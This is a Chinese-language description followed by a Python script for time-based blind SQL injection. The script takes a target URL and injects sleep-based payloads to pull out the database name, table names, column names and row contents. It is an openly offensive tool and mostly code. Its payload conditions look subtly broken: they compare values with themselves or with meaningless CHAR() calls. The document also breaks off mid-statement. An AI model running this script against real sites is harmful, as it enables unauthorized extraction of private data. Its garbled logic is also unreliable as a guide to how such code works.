### 
代码说明

这段代码是一个用于进行盲注（Blind SQL Injection）攻击的脚本，主要用于获取数据库的信息。以下是对代码的详细解释：

1. **全局变量：**
    - `DBName`: 用于存放数据库名。
    - `DBTables`: 用于存放数据库表的列表。
    - `DBColumns`: 用于存放数据库表字段的列表。
    - `DBData`: 用于存放数据字典，键为字段名，值为字段数据列表。

2. **设置请求会话：**
    - 通过`requests`库设置了重连次数以及将连接改为短连接，防止因为HTTP连接数过多导致的 Max retries exceeded with url。

3. **主要功能函数：**
    - `start_sqli(url)`: 主函数，用于开始进行盲注攻击。通过调用其他函数，获取数据库名、表名、字段名、字段数据等信息。
    
    - `get_db_name(url)`: 获取数据库名的函数。通过盲注方式获取数据库名的长度和具体的数据库名。
    
    - `get_db_tables(url, dbname)`: 获取数据库表的函数。通过盲注方式获取数据库表的数量、表名的长度以及具体的表名。
    
    - `get_db_columns(url, dbname, dbtable)`: 获取数据库表字段的函数。通过盲注方式获取数据库表字段的数量、字段名的长度以及具体的字段名。
    
    - `get_db_data(url, dbtable, dbcolumn)`: 获取表数据的函数。通过盲注方式获取字段数据的数量、数据长度以及具体的字段数据。

4. **辅助函数：**
    - `get_payload_length(url, payload)`: 用于获取长度的通用函数，通过盲注方式获取指定 payload 的长度。
    
    - `get_payload_data(url, payload, data_len, position=None)`: 用于获取数据的通用函数，通过盲注方式获取指定 payload 的数据。
    
    - `get_sleep_time(url, payload)`: 通过盲注方式获取 sleep 时间，即在响应中判断注入语句是否成功执行。

5. **命令行参数解析：**
    - 使用`optparse`库解析命令行参数，主要接受用户输入的目标 URL。

6. **执行主程序：**
    - 如果脚本被作为独立程序执行，就会调用`start_sqli`函数，并传入用户输入的目标 URL。

这段代码是一个用于进行盲注攻击的脚本，通过不断尝试获取数据库信息的方式，实现了获取数据库名、表名、字段名以及字段数据的功能

###
import requests
import optparse
import time

# 存放数据库名变量
DBName = ""
# 存放数据库表变量
DBTables = []
# 存放数据库字段变量
DBColumns = []
# 存放数据字典变量，键为字段名，值为字段数据列表
DBData = {}

# 设置重连次数以及将连接改为短连接，防止因为HTTP连接数过多导致的 Max retries ceeded with url
requests.adapters.DEFAULT_RETRIES = 5
conn = requests.session()
conn.keep_alive = False

# 盲注主函数
def start_sqli(url):
    get_db_name(url)
    print("[+]当前数据库名:{0}".format(DBName))
    get_db_tables(url, DBName)
    print("[+]数据库{0}的表如下:".format(DBName))
    for idx, table in enumerate(DBTables, start=1):
        print(f"({idx}) {table}")
    table_ind = int(input("[*]请输入要查看表的序号:")) - 1
    get_db_columns(url, DBName, DBTables[table_ind])
    while True:
        print("[+]数据表{0}的字段如下:".format(DBTables[table_ind]))
        for idx, column in enumerate(DBColumns, start=1):
            print(f"({idx}) {column}")
        column_ind = int(input("[*]请输入要查看字段的序号(输入0退出):")) - 1
        if column_ind == -1:
            break
        else:
            get_db_data(url, DBTables[table_ind], DBColumns[column_ind])

# 获取数据库名函数
def get_db_name(url):
    global DBName
    print("[-]开始获取数据库名长度")
    # 保存数据库名长度变量
    db_name_len = get_payload_length(url, "database()")
    print("[+]数据库名长度: {0}".format(db_name_len))
    
    print("[-]开始获取数据库名")
    DBName = get_payload_data(url, "database()", db_name_len)
    print("[-]数据库名: {0}".format(DBName))

# 获取数据库表函数
def get_db_tables(url, dbname):
    global DBTables
    print("[-]开始获取{0}数据库表数量:".format(dbname))
    # 存放数据库表数量的变量
    db_table_count = get_payload_length(url, f"(select count(table_name) from information_schema.tables where table_schema='{dbname}')")
    print("[+]{0}数据库的表数量为: {1}".format(dbname, db_table_count))
    
    print("[-]开始获取{0}数据库的表".format(dbname))
    for idx in range(db_table_count):
        print("[-]正在获取第{0}个表名".format(idx+1))
        table = get_payload_data(url, f"(select table_name from information_schema.tables where table_schema='{dbname}' limit {idx},1)", get_payload_length(url, f"(select length(table_name) from information_schema.tables where table_schema='{dbname}' limit {idx},1)"))
        DBTables.append(table)
        print(table)

# 获取数据库表的字段函数
def get_db_columns(url, dbname, dbtable):
    global DBColumns
    print("[-]开始获取{0}数据表的字段数:".format(dbtable))
    # 存放字段数量的变量
    db_column_count = get_payload_length(url, f"(select count(column_name) from information_schema.columns where table_schema='{dbname}' and table_name='{dbtable}')")
    print("[-]{0}数据表的字段数为: {1}".format(dbtable, db_column_count))
    
    print("[-]开始获取{0}数据表的字段".format(dbtable))
    for idx in range(db_column_count):
        print("[-]正在获取第{0}个字段名".format(idx+1))
        column = get_payload_data(url, f"(select column_name from information_schema.columns where table_schema='{dbname}' and table_name='{dbtable}' limit {idx},1)", get_payload_length(url, f"(select length(column_name) from information_schema.columns where table_schema='{dbname}' and table_name='{dbtable}' limit {idx},1)"))
        DBColumns.append(column)
        print(column)

# 获取表数据函数
def get_db_data(url, dbtable, dbcolumn):
    global DBData
    # 先获取字段数据数量
    db_data_count = get_payload_length(url, f"(select count({dbcolumn}) from {dbtable})")
    print("[-]开始获取{0}表{1}字段的数据数量".format(dbtable, dbcolumn))
    print("[-]{0}表{1}字段的数据数量为: {2}".format(dbtable, dbcolumn, db_data_count))
    
    for idx in range(db_data_count):
        print("[-]正在获取{0}的第{1}个数据".format(dbcolumn, idx+1))
        data_len = get_payload_length(url, f"(select length({dbcolumn}) from {dbtable} limit {idx},1)")
        print("[-]第{0}个数据长度为: {1}".format(idx+1, data_len))
        
        # 临时存放数据内容变量
        data = ""
        # 开始获取数据的具体内容
        for b in range(1, data_len+1):
            data += get_payload_data(url, f"(select {dbcolumn} from {dbtable} limit {idx},1)", 1, b)
            print(data)
        # 放到以字段名为键，值为列表的字典中存放
        DBData.setdefault(dbcolumn, []).append(data)
        print(DBData)
        # 把data清空来，继续获取下一个数据

def get_payload_length(url, payload):
    # 用于检查数据库名长度的payload
    payload_length = f"' and if(length({payload})=CHAR_LENGTH({payload}),sleep(5),0) %23"
    return get_sleep_time(url, payload_length)

def get_payload_data(url, payload, data_len, position=None):
    # 用于检查字段、表、数据内容的payload
    if position is not None:
        payload_data = f"' and if(ascii(substr({payload},{position},1))=ascii(substr(CHAR({payload}),{position},1)),sleep(5),0) %23"
    else:
        payload_data = f"' and if(ascii({payload})=ascii(CHAR({payload})),sleep(5),0) %23"
    return get_sleep_time(url, payload_data)

def get_sleep_time(url, payload):
    # 把URL和payload进行拼接得到最终的请求URL
    target_url = url + payload
    # 开始时间
    time_start = time.time()
    # 开始访问
    res = conn.get(target_url)
    # 结束时间
    time_end
